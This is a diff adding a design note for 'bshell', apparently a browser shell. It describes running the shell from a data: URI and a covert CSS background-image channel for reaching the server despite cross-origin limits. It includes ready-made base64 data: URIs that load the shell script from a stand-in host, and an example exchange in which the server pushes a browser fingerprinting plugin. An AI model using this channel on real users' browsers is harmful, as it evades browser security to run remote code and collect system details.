@@ -1,0 +1,74 @@
+# Running bshell from a data: URI
+
+
+#### Primary Mission
+Make bshell run from a data: URI
+
+#### Secondary Mission:
+Eliminate cross-domain restrictions for communicating with the server
+
+## HowItGotToBe
+
+The first attempt at making this work started in the browser console after entering an initial data:text/html;base64, uri:
+`LOG: starting BsHell bshell.js:297
+
+LOG: detected myself at http://exampledomain.com/bshell.js bshell.js:297
+
+Uncaught Error: SECURITY_ERR: DOM Exception 18 `
+
+This was because access the document.cookie property is restricted. try/catch and then further messages in the console:
+`XMLHttpRequest cannot load http://exampledomain.com/bshell.php. Cannot make any requests from null.`
+
+From null? That's because `document.location.origin` is null, understandably, since running from a data: uri, what would origin be?
+
+So, XHR is out of the way then. How else can we get to the server then? 
+
+Method of choice here was CSS-styling, exploiting the fact that you can pass rather big fragments of data in a image-uri, aswell as in a normal HTTP GET request parameter.
+
+
+## Methodology
+
+The method involves attaching an element with a unique id to the document, and then attaching a new &lt;link href=&gt; pointing to a customized server-script. This server script responds with a css declaration that attaches a background image to the (previously created) element. 
+
+Once the browser loads the stylesheet, our element will be styled with the background image and we can read the elements style using
+getComputedStyle (or currentStyle in IE). The image is a data: encoded uri, that we can easily decode and treat as a JSON packet.
+
+Sending data to the server is done using a normal GET query parameter.
+
+
+## Limitations
+
+- There has been no problems observed with way over 100kb sent to any browser.
+
+- Request-URI lengths are limited in most browsers and servers, so passing large packets of data back to the server _could_ be a problem.
+
+
+## Examples
+
+### data: URI
+Creating the data: URI is simple:
+`]$ echo "<html><head><script type='text/javascript' src='http://exampledomain.com/plugins/css_channel/css_channel.php/bshell.js'> </script></head></html>" | base64 -w0 |awk '{print "data:text/html;base64,"$0}'`
+
+Here it is for you if your setup is with exampledomain.com:
+`data:text/html;base64,PGh0bWw+PGhlYWQ+PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0naHR0cDovL2V4YW1wbGVkb21haW4uY29tL3BsdWdpbnMvY3NzX2NoYW5uZWwvY3NzX2NoYW5uZWwucGhwL2JzaGVsbC5qcyc+IDwvc2NyaXB0PjwvaGVhZD48L2h0bWw+Cg==`
+
+Or if you use 127.0.0.1:
+`data:text/html;base64,PGh0bWw+PGhlYWQ+PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0naHR0cDovLzEyNy4wLjAuMS9wbHVnaW5zL2Nzc19jaGFubmVsL2Nzc19jaGFubmVsLnBocC9ic2hlbGwuanMnPiA8L3NjcmlwdD48L2hlYWQ+PC9odG1sPgo=`
+
+
+### Example sequence
+
+C => S
+http://exampledomain.com/plugins/css_channel/css_channel.php/bshell.js
+
+S => C
+var options = {url:'http://exampledomain.com/plugins/css_channel/css_channel.php', requestMethod:'css_channel', plugins: ['browser_detect', 'base64', 'css_channel']};
+... bshell.js ..
+
+C => S
+http://exampledomain.com/plugins/css_channel/css_channel.php/?req=%7B%22domain%22%3A%22%22%2C%22page%22%3A%22data%3Atext/html%3Bbase64%2CPGh0bWw+PGhlYWQ+PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIHNyYz0naHR0cDovL2V4YW1wbGVkb21haW4uY29tL3BsdWdpbnMvY3NzX2NoYW5uZWwvY3NzX2NoYW5uZWwucGhwL2JzaGVsbC5qcyc+IDwvc2NyaXB0PjwvaGVhZD48L2h0bWw+Cg%3D%3D%22%2C%22cmd%22%3A%22start%22%2C%22css_id%22%3A747417%7D&r=0.2582474513910711
+
+S => C
+#y747417y { background-image: url(data:image/png;base64,eyJpZCI6ImJyb3dzZXJfZGV0ZWN0LmpzIiwiY29kZSI6ImZ1bmN0aW9uKGJzaGVsbCkge1xuICAgIGlmKCFic2hlbGwucmVxdWlyZV9wbHVnaW4oJ2Jyb3dzZXJfZGV0ZWN0JykpIHtcblx0cmV0dXJuIFwicmVxdWlyZWQgcGx1Z2lucyBub3QgbG9hZGVkIHlldFwiO1xuICAgIH1cblxuICAgIHZhciBiZCA9IGJzaGVsbC5wbHVnaW5zLmJyb3dzZXJfZGV0ZWN0O1xuICAgIHJldHVybiB7YnJvd3NlcjogYmQuYnJvd3Nlcixcblx0ICAgIGJ2ZXJzaW9uOiBiZC5idmVyc2lvbixcblx0ICAgIG9zOiBiZC5vcyxcblx0ICAgIGZsYXNoOiBiZC5mbGFzaCxcblx0ICAgIGphdmE6IGJkLmphdmF9O1xufShic2hlbGwpOyJ9);
+}
+
